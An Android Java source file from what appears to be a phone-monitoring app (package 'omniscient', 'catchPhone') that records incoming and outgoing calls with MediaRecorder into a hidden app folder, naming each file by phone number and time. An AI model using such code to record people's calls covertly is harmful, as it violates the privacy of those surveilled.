package com.postal.omniscient.postal.catchPhone.Call;

import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Environment;
import android.util.Log;

import com.postal.omniscient.postal.adapter.EventBusCall;
import com.postal.omniscient.postal.adapter.EventBusData;

import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;
import org.greenrobot.eventbus.ThreadMode;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Created by Александр on 02.08.2016.
 */
public class CallInThread extends Thread {

    public CallInThread(Context context, String in_out_Call, String folderName, String fileName){
        this.context = context;
        this.folderName = folderName;
        this.fileName = fileName;
        this.in_out_Call = in_out_Call;//номер исходящего/входящего звонка
    }

    private Context context;
    private String in_out_Call, folderName, fileName;
    private MediaRecorder recorder;
    private File audiofile;
    private String time = new SimpleDateFormat("yyyy_dd_MM_HH-mm-ss")
            .format(new Date());
    private String no_written = "no_written_";
    private String file_name = in_out_Call + "_" + time;
    private File tempFile = null;


    @Override
    public void run() {
        recordStart();
    }

    private void recordStart() {
        EventBus.getDefault().register(this);

        File sampleDir = new File(context.getFilesDir(), "/Omniscient/"+folderName);

        if (!sampleDir.exists()) {
            sampleDir.mkdirs();
        }

        try {
            tempFile = File.createTempFile(no_written+in_out_Call + "_" + time, fileName, sampleDir);
            audiofile = tempFile;
        } catch (IOException e) {
            Log.i("MyMsg", "Eror T -1 " + e);
        }

        recorder = new MediaRecorder();

        recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);//VOICE_COMMUNICATION ip call
        recorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        recorder.setOutputFile(audiofile.getAbsolutePath());
        try {
            recorder.prepare();
            recorder.start();
            Log.i("MyMsg", "Start Record ");
        } catch (IllegalStateException e) {
            Log.i("MyMsg", "Eror T0 " + e);
        } catch (IOException e) {
            Log.i("MyMsg", "Eror T1 " + e);
        } catch (Exception e) {
            Log.i("MyMsg", "Eror Record " + e);
        }



    }
    public void recordStop(){
        recorder.stop();
        recorder.release();
        recorder = null;
        Log.i("MyMsg", "call off");
        renameFile();
        EventBus.getDefault().post(new EventBusData("call_off"));
        EventBus.getDefault().unregister(this);
    }

    private void renameFile() {
        File dir = new File(context.getFilesDir(), "/Omniscient/"+folderName);
        if(dir.exists()){


            File from = tempFile;//new File(dir,no_written+file_name+fileName);
            File to = new File(dir,in_out_Call + "_" + time+fileName);
            if(from.exists())
                from.renameTo(to);
        }
    }


    @Subscribe(threadMode = ThreadMode.ASYNC)
    public void onEvent(EventBusCall event){
        String command = event.getComand();
        if(command.equals("stop")){
            recordStop();

        }
    }

}
